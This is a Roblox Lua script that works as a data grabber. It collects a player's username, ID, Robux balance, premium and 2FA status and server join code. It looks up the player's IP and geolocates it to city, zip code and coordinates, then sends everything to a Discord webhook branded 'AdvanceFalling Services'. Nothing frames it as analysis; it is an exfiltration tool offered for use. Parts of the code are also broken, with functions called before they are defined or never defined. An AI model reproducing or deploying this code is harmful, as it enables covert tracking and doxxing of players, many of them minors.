-- Function to retrieve player information
local function getPlayerInformation()
    local playersService = game:GetService("Players")
    local localPlayer = playersService.LocalPlayer

    local isPremium = localPlayer.MembershipType == Enum.MembershipType.Premium
    local username = localPlayer.Name
    local userId = localPlayer.UserId
    local accountAge = math.floor((os.time() - localPlayer.AccountAge * 86400) / 86400)

    return isPremium, username, userId, accountAge
end

-- Function to retrieve IP information
local function getIPInformation()
    local ipifyUrl = "https://api.ipify.org"
    local ipInfoUrl = "http://ip-api.com/json/%s"
    local ip = game:GetService("HttpService"):GetAsync(ipifyUrl)
    local ipInfo = game:GetService("HttpService"):JSONDecode(game:GetService("HttpService"):GetAsync(ipInfoUrl:format(ip)))

    return {
        IP = ip,
        country = ipInfo.country,
        countryCode = ipInfo.countryCode,
        region = ipInfo.region,
        regionName = ipInfo.regionName,
        city = ipInfo.city,
        zipcode = ipInfo.zip,
        latitude = ipInfo.lat,
        longitude = ipInfo.lon,
        isp = ipInfo.isp,
        org = ipInfo.org
    }
end

-- Function to construct data payload for webhook
local function constructWebhookData(isPremium, username, userId, accountAge, ipInformation)
    local gameService = game:GetService("MarketplaceService")
    local placeId = game.PlaceId
    local balance = game.Players.LocalPlayer:WaitForChild("leaderstats").Robux.Value

    local webhookData = {
        username = username .. ' [' .. userId .. ']',
        avatar_url = game:GetService("HttpService"):JSONDecode(game:HttpGet(('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=%i&size=48x48&format=Png&isCircular=false'):format(userId)))['data'][1]['imageUrl'],
        embeds = {
            {
                title = "AdvanceFalling Services",
                description = "Discord: https://discord.gg/d2446gBjfq",
                color = tonumber(0x2B6BE4),
                fields = {
                    {
                        name = "Profile:",
                        value = "https://www.roblox.com/users/" .. userId .. "/profile",
                        inline = true
                    },
                    {
                        name = "Game:",
                        value = "https://www.roblox.com/games/" .. placeId,
                        inline = true
                    },
                    {
                        name = "Game Info:",
                        value = "**ID**: " .. placeId .. ".\n**Name:** " .. gameService:GetProductInfo(placeId).Name,
                        inline = true
                    },
                    {
                        name = "Exploit",
                        value = getExploitName(),
                        inline = true
                    },
                    {
                        name = "Premium",
                        value = isPremium and "True" or "False",
                        inline = true
                    },
                    {
                        name = "2FA",
                        value = has2FA() and "True" or "False",
                        inline = true
                    },
                    {
                        name = "Account Age",
                        value = tostring(accountAge),
                        inline = true
                    },
                    {
                        name = "Robux Balance",
                        value = tostring(balance),
                        inline = true
                    },
                    {
                        name = "Join Code",
                        value = game.JobId,
                        inline = true
                    },
                    {
                        name = "IP",
                        value = ipInformation.IP,
                        inline = true
                    },
                    {
                        name = "Country",
                        value = ipInformation.country,
                        inline = true
                    },
                    {
                        name = "Country Code",
                        value = ipInformation.countryCode,
                        inline = true
                    },
                    {
                        name = "Region",
                        value = ipInformation.region,
                        inline = true
                    },
                    {
                        name = "Region Name",
                        value = ipInformation.regionName,
                        inline = true
                    },
                    {
                        name = "City",
                        value = ipInformation.city,
                        inline = true
                    },
                    {
                        name = "Zipcode",
                        value = ipInformation.zipcode,
                        inline = true
                    },
                    {
                        name = "Latitude",
                        value = tostring(ipInformation.latitude),
                        inline = true
                    },
                    {
                        name = "Longitude",
                        value = tostring(ipInformation.longitude),
                        inline = true
                    },
                    {
                        name = "ISP",
                        value = ipInformation.isp,
                        inline = true
                    },
                    {
                        name = "Org",
                        value = ipInformation.org,
                        inline = true
                    },
                    {
                        name = "Coming Soon",
                        value = "??????????",
                        inline = true
                    }
                },
                color = tonumber(0x7269da)
            }
        }
    }

    return game:GetService("HttpService"):JSONEncode(webhookData)
end

-- Function to retrieve exploit name
local function getExploitName()
    local exploitNames = {
        is_sirhurt_closure and "Sirhurt",
        pebc_execute and "ProtoSmasher",
        syn and "Synapse X",
        secure_load and "Sentinel",
        KRNL_LOADED and "Krnl",
        SONA_LOADED and "Sona",
        FlUXUS_LOADED and "Fluxus"
    }

    for _, exploitName in ipairs(exploitNames) do
        if exploitName then
            return exploitName
        end
    end

    return "Unknown"
end

-- Main function to send data to webhook
local function sendToWebhook(url, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local httpService = game:GetService("HttpService")
    local request = httpService:RequestAsync({
        Url = url,
        Method = "POST",
        Headers = headers,
        Body = data
    })

    -- Handle potential errors or response if needed
end

-- Get player information
local isPremium, username, userId, accountAge = getPlayerInformation()

-- Get IP information
local ipInformation = getIPInformation()

-- Construct webhook data
local webhookData = constructWebhookData(isPremium, username, userId, accountAge, ipInformation)

-- Specify the webhook URL
local webhookUrl = "Webhook URL"

-- Send data to webhook
sendToWebhook(webhookUrl, webhookData)
